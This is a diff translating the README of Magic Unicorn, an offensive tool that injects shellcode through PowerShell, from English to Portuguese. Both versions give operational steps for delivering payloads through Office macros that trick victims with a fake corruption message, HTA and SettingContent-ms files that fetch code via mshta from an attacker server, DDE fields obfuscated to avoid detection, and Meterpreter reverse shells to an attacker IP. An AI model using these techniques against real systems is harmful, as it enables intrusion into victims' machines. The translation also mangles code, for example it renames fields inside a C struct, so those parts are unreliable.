@@ -1,13 +1,13 @@
-unicorn
+unicórnio
 =======
 
-Written by: Dave Kennedy (@HackingDave)
-Website: https://www.trustedsec.com
+Escrito por: Dave Kennedy (@HackingDave)
+Site: https://www.trustedsec.com
 
-Magic Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18.
+Magic Unicorn é uma ferramenta simples para usar um ataque de downgrade do PowerShell e injetar shellcode diretamente na memória. Baseado nos ataques powershell de Matthew Graeber e na técnica de bypass powershell apresentada por David Kennedy (TrustedSec) e Josh Kelly na Defcon 18.
 
-Usage is simple, just run Magic Unicorn (ensure Metasploit is installed if using Metasploit methods and in the right path) and magic unicorn will automatically generate a powershell command that you need to simply cut and paste the powershell code into a command line window or through a payload delivery system. Unicorn supports your own shellcode, cobalt strike, and Metasploit.
-```
+O uso é simples, basta executar o Magic Unicorn (certifique-se de que o Metasploit esteja instalado se estiver usando métodos Metasploit e no caminho certo) e o magic unicorn gerará automaticamente um comando powershell que você precisa simplesmente recortar e colar o código powershell em uma janela de linha de comando ou através um sistema de entrega de carga útil. O Unicorn suporta seu próprio shellcode, ataque de cobalto e Metasploit.
+
 root@rel1k:~/Desktop# python unicorn.py 
 
                                                          ,/
@@ -80,91 +80,91 @@ Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted
 Help Menu: python unicorn.py --help
 ```
 
-###                -----POWERSHELL ATTACK INSTRUCTIONS----
+###              -----INSTRUÇÕES DE ATAQUE DO POWERSHELL----
 
-Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.
+Tudo agora é gerado em dois arquivos, powershell_attack.txt e unicorn.rc. O arquivo de texto contém todo o código necessário para injetar o ataque powershell na memória. Observe que você precisará de um local que suporte algum tipo de injeção de comando remoto. Muitas vezes, isso pode ser feito por meio de um documento do Excel/Word ou por meio de psexec_commands dentro do Metasploit, SQLi, etc. Existem muitas implicações e cenários para onde você pode usar esse ataque. Basta colar o comando powershell_attack.txt em qualquer janela do prompt de comando ou onde você puder chamar o executável do powershell e ele retornará um shell para você. Este ataque também oferece suporte a windows/download_exec para um método de carga útil em vez de apenas cargas úteis do Meterpreter. Ao usar o download e o exec, basta colocar python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe e o código do powershell fará o download da carga útil e executará.
 
-Note that you will need to have a listener enabled in order to capture the attack.
+Observe que você precisará ter um ouvinte habilitado para capturar o ataque.
 
-###                -----MACRO ATTACK INSTRUCTIONS----
+### -----INSTRUÇÕES DE ATAQUE DE MACRO----
 
-For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do
-that, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code
-into that. This will automatically run. Note that a message will prompt to the user saying that the file
-is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the
-victim to thinking the excel document is corrupted. You should get a shell through powershell injection
-after that.
+Para o ataque de macro, você precisará ir para Arquivo, Propriedades, Faixas e selecionar Desenvolvedor. Assim que você fizer
+isso, você terá uma guia de desenvolvedor. Crie uma nova macro, chame-a de Auto_Open e cole o código gerado
+nisso. Isso será executado automaticamente. Observe que uma mensagem solicitará ao usuário dizendo que o arquivo
+está corrompido e fecha automaticamente o documento Excel. ESSE É UM COMPORTAMENTO NORMAL! Isso está enganando o
+vítima de pensar que o documento do Excel está corrompido. Você deve obter um shell por meio de injeção de powershell
+depois disso.
 
-If you are deploying this against Office365/2016+ versions of Word you need to modify the first line of 
-the output from: Sub Auto_Open()
+Se você estiver implantando isso nas versões Office365/2016+ do Word, precisará modificar a primeira linha de
+a saída de: Sub Auto_Open()
  
-To: Sub AutoOpen()
+Para: Sub AutoOpen()
  
-The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme.
+O nome da própria macro também deve ser "AutoOpen" em vez do esquema de nomenclatura herdado "Auto_Open".
 
-NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO
-REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR WILL
-HAPPEN!
+OBS: AO COPIAR E COLAR O EXCEL, SE TIVER ESPAÇOS ADICIONAIS ADICIONADOS, VOCÊ PRECISA
+REMOVA-OS DEPOIS DE CADA UMA DAS SEÇÕES DO CÓDIGO POWERSHELL NA VARIÁVEL "x" OU UM ERRO DE SINTAXE IRÁ
+ACONTECER!
 
-###                -----HTA ATTACK INSTRUCTIONS----
+### -----INSTRUÇÕES DE ATAQUE HTA----
 
-The HTA attack will automatically generate two files, the first the index.html which tells the browser to
-use Launcher.hta which contains the malicious powershell injection code. All files are exported to the
-hta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the
-last, the unicorn.rc file. You can run msfconsole -r unicorn.rc to launch the listener for  Metasploit.
+O ataque HTA gerará automaticamente dois arquivos, o primeiro o index.html que diz ao navegador para
+use Launcher.hta que contém o código de injeção de powershell malicioso. Todos os arquivos são exportados para o
+hta_access/ pasta e haverá três arquivos principais. O primeiro é index.html, o segundo Launcher.hta e o
+por último, o arquivo unicorn.rc. Você pode executar msfconsole -r unicorn.rc para iniciar o ouvinte do Metasploit.
 
-A user must click allow and accept when using the HTA attack in order for the powershell injection to work
-properly.
+Um usuário deve clicar em permitir e aceitar ao usar o ataque HTA para que a injeção de powershell funcione
+devidamente.
 
-###                -----CERTUTIL Attack Instruction----
+### -----Instrução de Ataque CERTUTIL----
 
-The certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take
-a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to
-a binary for you. This should work on virtually any system and allow you to transfer a binary to the victim
-machine through a fake certificate file. To use this attack, simply place an executable in the path of
-unicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once that's finished,
-go to decode_attack/ folder which contains the files. The bat file is a command that can be run in a
-windows machine to convert it back to a binary.
+O vetor de ataque certutil foi identificado por Matthew Graeber (@mattifestation) que permite que você tome
+um arquivo binário, mova-o para um formato base64 e use certutil na máquina da vítima para convertê-lo de volta para
+um binário para você. Isso deve funcionar em praticamente qualquer sistema e permitir que você transfira um binário para a vítima
+máquina através de um arquivo de certificado falso. Para usar este ataque, basta colocar um executável no caminho do
+unicorn e execute python unicorn.py <exe_name> crt para obter a saída base64. Assim que terminar,
+vá para a pasta decode_attack/ que contém os arquivos. O arquivo bat é um comando que pode ser executado em um
+máquina Windows para convertê-lo de volta em um binário.
 
 
-###                -----Custom PS1 Attack Instructions----
+### -----Instruções de ataque PS1 personalizadas ----
 
-This attack method allows you to convert any PowerShell file (.ps1) into an encoded command or macro.
+Esse método de ataque permite converter qualquer arquivo do PowerShell (.ps1) em um comando ou macro codificado.
 
-Note if choosing the macro option, a large ps1 file may exceed the amount of carriage returns allowed by
-VBA. You may change the number of characters in each VBA string by passing an integer as a parameter.
+Observe que, ao escolher a opção de macro, um arquivo ps1 grande pode exceder a quantidade de retornos de carro permitidos pelo
+VBA. Você pode alterar o número de caracteres em cada string VBA passando um inteiro como parâmetro.
 
-Examples:
+Exemplos:
 
     python unicorn.py harmless.ps1
     python unicorn.py myfile.ps1 macro
     python unicorn.py muahahaha.ps1 macro 500
 
-The last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.
+O último usará uma string de 500 caracteres em vez do padrão 380, resultando em menos retornos de carro no VBA.
 
 
 
 
-###                -----DDE Office COM Attack Instructions----
+### -----Instruções de ataque DDE Office COM ----
 
-This attack vector will generate the DDEAUTO formulate to place into Word or Excel. The COM object 
-DDEInitilize and DDEExecute allow for formulas to be created directly within Office which causes the
-ability to gain remote code execution without the need of macros. This attack was documented and full
-instructions can be found at:
+Este vetor de ataque irá gerar a fórmula DDEAUTO para colocar no Word ou Excel. O objeto COM
+DDEInitilize e DDEExecute permitem que fórmulas sejam criadas diretamente no Office, o que faz com que o
+capacidade de obter execução remota de código sem a necessidade de macros. Este ataque foi documentado e completo
+instruções podem ser encontradas em:
 
 https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
 
-In order to use this attack, run the following examples:
+Para usar este ataque, execute os seguintes exemplos:
 
     python unicorn.py <payload> <lhost> <lport> dde
     python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde
 
-Once generated, a powershell_attack.txt will be generated which contains the Office code, and the
-unicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to
-handle the listener for the payload. In addition a download.ps1 will be exported as well (explained
-in the latter section).
+Uma vez gerado, a powershell_attack.txt será gerado que contém o código do Office e o
+unicorn.rc arquivo que é o componente ouvinte que pode ser chamado por msfconsole -r unicorn.rc para
+lidar com o ouvinte para a carga útil. além disso um download.ps1 também serão exportados (explicado
+na última seção).
 
-In order to apply the payload, as an example (from sensepost article):
+Para aplicar o payload, como exemplo (do artigo do sensepost):
 
 1. Open Word
 2. Insert tab -> Quick Parts -> Field
@@ -174,150 +174,149 @@ In order to apply the payload, as an example (from sensepost article):
 6. Paste in the code from Unicorn
 7. Save the Word document.
 
-Once the office document is opened, you should receive a shell through powershell injection. Note
-that DDE is limited on char size and we need to use Invoke-Expression (IEX) as the method to download.
+Depois que o documento do Office for aberto, você deverá receber um shell por meio da injeção de powershell. Observação
+esse DDE é limitado no tamanho do caractere e precisamos usar Invoke-Expression (IEX) como o método de download.
 
-The DDE attack will attempt to download download.ps1 which is our powershell injection attack since
-we are limited to size restrictions. You will need to move the download.ps1 to a location that is
-accessible by the victim machine. This means that you need to host the download.ps1 in an Apache2
-directory that it has access to.
+O ataque DDE tentará baixar download.ps1, que é nosso ataque de injeção de powershell desde
+estamos limitados a restrições de tamanho. Você precisará mover o download.ps1 para um local que seja
+acessível pela máquina da vítima. Isso significa que você precisa hospedar o download.ps1 em um Apache2
+diretório ao qual ele tem acesso.
 
-You may notice that some of the commands use "{ QUOTE" these are ways of masking specific commands
-which is documented here: http://staaldraad.github.io/2017/10/23/msword-field-codes/. In this case
-we are changing WindowsPowerShell, powershell.exe, and IEX to avoid detection. Also check out the URL
-as it has some great methods for not calling DDE at all.
+Você pode notar que alguns dos comandos usam "{ QUOTE" estas são formas de mascarar comandos específicos
+que está documentado aqui: http://staaldraad.github.io/2017/10/23/msword-field-codes/. Nesse caso
+estamos mudando WindowsPowerShell, powershell.exe, and IEX to evitar a detecção. Confira também a URL
+pois tem alguns ótimos métodos para não chamar o DDE.
 
-###                -----Import Cobalt Strike Beacon----
+###               -----Farol de Cobalto de Importação ----
 
-This method will import direct Cobalt Strike Beacon shellcode directly from Cobalt Strike.
+Este método importará o shellcode direto do Cobalt Strike Beacon diretamente do Cobalt Strike.
 
-Within Cobalt Strike, export the Cobalt Strike "CS" (C#) export and save it to a file. For example, call 
-the file, cobalt_strike_file.cs. 
+No Cobalt Strike, exporte a exportação Cobalt Strike "CS" (C#) e salve-a em um arquivo. Por exemplo, ligue
+o arquivo, cobalt_strike_file.cs.
 
-The export code will look something like this:
+O código de exportação será mais ou menos assim:
 
 * length: 836 bytes */
 byte[] buf = new byte[836] { 0xfc, etc
 
-Next, for usage:
+Em seguida, para uso:
 
     python unicorn.py cobalt_strike_file.cs cs
 
-The cs argument tells Unicorn that you want to use the Cobalt strike functionality. The rest is Magic.
+O argumento cs informa ao Unicorn que você deseja usar a funcionalidade Cobalt strike. O resto é Magia.
 
-Next simply copy the powershell command to something you have the ability for remote command execution.
+Em seguida, simplesmente copie o comando powershell para algo que você tenha a capacidade de execução de comando remoto.
 
-NOTE: THE FILE MUST BE EXPORTED IN THE C# (CS) FORMAT WITHIN COBALT STRIKE TO PARSE PROPERLY.
+OBSERVAÇÃO: O ARQUIVO DEVE SER EXPORTADO NO FORMATO C# (CS) DENTRO DO COBALT STRIKE PARA ANALISAR CORRETAMENTE.
 
-There are some caveats with this attack. Note that the payload size will be a little over 14k+ in byte
-size. That means that from a command line argument perspective if you copy and paste you will hit the
-8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from cmd.exe
-this is an issue, however if you are launching directly from PowerShell or other normal applications
-this is a non-problem.
+Existem algumas ressalvas com este ataque. Observe que o tamanho da carga será um pouco mais de 14k+ em bytes
+Tamanho. Isso significa que, de uma perspectiva de argumento de linha de comando, se você copiar e colar, atingirá o
+Restrição de tamanho de 8191 caracteres (codificada em cmd.exe). Se você estiver iniciando diretamente do cmd.exe
+isso é um problema, no entanto, se você estiver iniciando diretamente do PowerShell ou de outros aplicativos normais
+isso não é problema.
 
-A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:
+Alguns exemplos aqui, wscript.shell e powershell usam USHORT - 65535 / 2 = 32767 limite de tamanho:
 
     typedef struct _UNICODE_STRING {
-        USHORT Length;
+        USHORT Comprimento;
         USHORT MaximumLength;
-        PWSTR  Buffer;
+        Tampão PWSTR;
     } UNICODE_STRING;
 
-For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no
-issues.
+Para este ataque, se você estiver iniciando diretamente do powershell, VBSCript (WSCRIPT.SHELL), não há
+questões.
 
-###                 -----Custom Shellcode Generation Method----
+### -----Método de geração de shellcode personalizado----
 
-This method will allow you to insert your own shellcode into the Unicorn attack. The PowerShell code
-will increase the stack side of the powershell.exe (through VirtualAlloc) and inject it into memory.
+Este método permitirá que você insira seu próprio shellcode no ataque Unicorn. O código do PowerShell
+aumentará o lado da pilha do powershell.exe (através do VirtualAlloc) e o injetará na memória.
 
-Note that in order for this to work, your txt file that you point Unicorn to must be formatted in the 
-following format or it will not work:
+Observe que, para que isso funcione, seu arquivo txt para o qual você aponta o Unicorn deve ser formatado no
+seguinte formato ou não funcionará:
 
-0x00,0x00,0x00 and so on.
+0x00,0x00,0x00 e assim por diante.
 
-Also note that there is size restrictions. The total length size of the PowerShell command cannot exceed
-the size of 8191. This is the max command line argument size limit in Windows.
+Observe também que há restrições de tamanho. O tamanho total do comprimento do comando PowerShell não pode exceder
+o tamanho de 8191. Este é o limite máximo de tamanho de argumento de linha de comando no Windows.
 
-Usage:
+Uso:
 
     python unicorn.py shellcode_formatted_properly.txt shellcode
 
-Next simply copy the powershell command to something you have the ability for remote command execution.
+Em seguida, simplesmente copie o comando powershell para algo que você tenha a capacidade de execução de comando remoto.
 
-NOTE: THE FILE MUST PROPERLY BE FORMATTED IN A 0x00,0x00,0x00 TYPE FORMAT WITH NOTHING ELSE OTHER THAN
-YOUR SHELLCODE IN THE TXT FILE.
+NOTA: O ARQUIVO DEVE SER CORRETAMENTE FORMATADO EM UM FORMATO TIPO 0x00,0x00,0x00 COM NADA ALÉM DE
+SEU SHELLCODE NO ARQUIVO TXT.
 
-There are some caveats with this attack. Note that if your payload size is large in nature it will not
-fit in cmd.exe. That means that from a command line argument perspective if you copy and paste you will 
-hit the 8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from 
-cmd.exe this is an issue, however if you are launching directly from PowerShell or other normal 
-applications this is a non-problem.
+Existem algumas ressalvas com este ataque. Observe que, se o tamanho da sua carga útil for grande por natureza, não
+caber em cmd.exe. Isso significa que, de uma perspectiva de argumento de linha de comando, se você copiar e colar,
+atingiu a restrição de tamanho de 8191 caracteres (codificada em cmd.exe). Se você estiver iniciando diretamente de
+cmd.exe isso é um problema, no entanto, se você estiver iniciando diretamente do PowerShell ou outro
+aplicações isso não é um problema.
 
-A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:
-
+Alguns exemplos aqui, wscript.shell e powershell usam USHORT - 65535 / 2 = 32767 limite de tamanho:
     typedef struct _UNICODE_STRING {
         USHORT Length;
         USHORT MaximumLength;
         PWSTR  Buffer;
     } UNICODE_STRING;
 
-For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no  
-issues.
+Para este ataque, se você estiver iniciando diretamente do powershell, VBSCript (WSCRIPT.SHELL), não há
+questões.
 
-###                 -----SettingContent-ms Extension Method----
+### -----Método de extensão SettingContent-ms----
 
 
-First, if you haven't had a chance, head over to the awesome SpectreOps blog from Matt Nelson (enigma0x3):
+Primeiro, se você ainda não teve a chance, acesse o incrível blog SpectreOps de Matt Nelson (enigma0x3):
 
 https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39
 
-This method uses a specific file type called ".SettingContent-ms" which allows for the ability for both
-direct loads from browsers (open + command execution) as well as extension type through embedding in 
-office products. This one specifically will focus on extension type settings for command execution
-within Unicorn's PowerShell attack vector.
+Este método usa um tipo de arquivo específico chamado ".SettingContent-ms" que permite a capacidade de ambos
+cargas diretas de navegadores (abrir + execução de comando), bem como tipo de extensão por meio de incorporação em
+produtos de escritório. Este focará especificamente nas configurações do tipo de extensão para execução de comandos
+dentro do vetor de ataque PowerShell do Unicorn.
 
-There are multiple methods supported with this attack vector. Since there is a limited character size
-with this attack, the method for deployment is an HTA. 
+Existem vários métodos compatíveis com esse vetor de ataque. Como há um tamanho de caractere limitado
+com esse ataque, o método de implantação é um HTA.
 
-For a detailed understanding on weaponizing this attack visit:
+Para uma compreensão detalhada sobre como armar este ataque, visite:
 
 https://www.trustedsec.com/2018/06/weaponizing-settingcontent/
 
-The steps you'll need to do to complete this attack is generate your .SettingContent-ms file from
-either a standalone or hta. The HTA method supports Metasploit, Cobalt Strike, and direct
-shellcode attacks.
+As etapas que você precisará executar para concluir este ataque são gerar seu arquivo .SettingContent-ms de
+autônomo ou hta. O método HTA suporta Metasploit, Cobalt Strike e direct
+ataques de shellcode.
 
-The four methods below on usage: 
+Os quatro métodos abaixo sobre o uso:
 
 HTA SettingContent-ms Metasploit: `python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms`  
 HTA Example SettingContent-ms: `python unicorn.py <cobalt_strike_file.cs cs ms`  
 HTA Example SettingContent-ms: `python unicorn.py <patth_to_shellcode.txt>: shellcode ms`  
 Generate .SettingContent-ms: `python unicorn.py ms`
 
-The first is a Metasploit payload, the second a Cobalt Strike, the third your own shellcode, and the fourth
-just a blank .SettingContent-ms file. 
+O primeiro é uma carga útil do Metasploit, o segundo é um Cobalt Strike, o terceiro é o seu próprio shellcode e o quarto
+apenas um arquivo .SettingContent-ms em branco.
 
-When everything is generated, it will export a file called Standalone_NoASR.SettingContent-ms either in
-the default root Unicorn directory (if using the standalone file generation) or under the hta_attack/
-folder. You will need to edit the Standalone_NoASR.SettingContent-ms file and replace:
+Quando tudo for gerado, ele exportará um arquivo chamado Standalone_NoASR.SettingContent-ms em
+o diretório raiz padrão do Unicorn (se estiver usando a geração de arquivo independente) ou sob o hta_attack/
+pasta. Você precisará editar o arquivo Standalone_NoASR.SettingContent-ms e substituir:
 
-REPLACECOOLSTUFFHERE
+SUBSTITUA COISAS LEGAIS AQUI
 
-With:
+Com:
 
 mshta http://<apache_server_ip_or_dns_name/Launcher.hta.
 
-Then move the contents of the hta_attack to /var/www/html.
+Em seguida, mova o conteúdo do hta_attack para /var/www/html.
 
-Once the victim either clicks the .SettingContent-ms file, mshta will be called on the victim machine
-then download the Unicorn HTA file which has the code execution capabilites. 
+Assim que a vítima clicar no arquivo .SettingContent-ms, o mshta será chamado na máquina da vítima
+em seguida, baixe o arquivo Unicorn HTA que possui os recursos de execução de código.
 
-Special thanks and kudos to Matt Nelson for the awesome research
+Agradecimentos especiais e elogios a Matt Nelson pela incrível pesquisa
 
-Also check out: https://www.trustedsec.com/2018/06/weaponizing-settingcontent/
+Confira também: https://www.trustedsec.com/2018/06/weaponizing-settingcontent/
 
-Usage: 
+Uso:
 
     python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
     python unicorn.py <cobalt_strike_file.cs cs ms
